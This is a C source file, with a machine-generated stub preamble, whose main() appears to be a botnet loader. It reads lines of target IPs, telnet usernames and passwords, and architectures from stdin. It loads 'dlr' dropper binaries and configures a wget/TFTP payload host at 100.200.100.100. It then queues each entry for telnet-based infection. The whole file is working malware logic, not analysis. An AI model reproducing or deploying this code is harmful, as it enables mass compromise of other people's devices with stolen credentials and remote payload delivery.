#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  scalar_t__ uint32_t ;
struct telnet_info {int dummy; } ;
typedef  int /*<<< orphan*/  strbuf ;
typedef  int /*<<< orphan*/  pthread_t ;
typedef  int /*<<< orphan*/  ipv4_t ;
struct TYPE_4__ {int /*<<< orphan*/  curr_open; int /*<<< orphan*/  total_input; } ;

/* Variables and functions */
 scalar_t__ ATOMIC_GET (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  ATOMIC_INC (int /*<<< orphan*/ *) ; 
 scalar_t__ TRUE ; 
 int /*<<< orphan*/  _SC_NPROCESSORS_ONLN ; 
 int /*<<< orphan*/  binary_init () ; 
 int /*<<< orphan*/ * calloc (int,int) ; 
 int /*<<< orphan*/ * fgets (char*,int,int /*<<< orphan*/ ) ; 
 char* id_tag ; 
 int /*<<< orphan*/  inet_addr (char*) ; 
 int /*<<< orphan*/  memset (struct telnet_info*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  pthread_create (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 TYPE_1__* server_create (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int,char*,int,char*) ; 
 int /*<<< orphan*/  server_queue_telnet (TYPE_1__*,struct telnet_info*) ; 
 int /*<<< orphan*/  sleep (int) ; 
 TYPE_1__* srv ; 
 int /*<<< orphan*/  stats_thread ; 
 int /*<<< orphan*/  stdin ; 
 scalar_t__ strlen (char*) ; 
 int /*<<< orphan*/  sysconf (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/ * telnet_info_parse (char*,struct telnet_info*) ; 
 int /*<<< orphan*/  usleep (int) ; 
 int /*<<< orphan*/  util_trim (char*) ; 

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

#ifdef DEBUG
    addrs_len = 1;
    addrs = calloc(4, sizeof (ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
#else
    addrs_len = 2;
    addrs = calloc(addrs_len, sizeof (ipv4_t));

    addrs[0] = inet_addr("192.168.0.1"); // Address to bind to
    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
#endif

    if (argc == 2)
    {
        id_tag = args[1];
    }

    if (!binary_init())
    {
        printf("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }

    /*                                                                                   wget address           tftp address */
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    // Read from stdin
    while (TRUE)
    {
        char strbuf[1024];

        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)
            break;

        util_trim(strbuf);

        if (strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) == NULL)
            printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
        else
        {
            if (srv == NULL)
                printf("srv == NULL 2\n");

            server_queue_telnet(srv, &info);
            if (total++ % 1000 == 0)
                sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    printf("Hit end of input.\n");

    while(ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);

    return 0;
}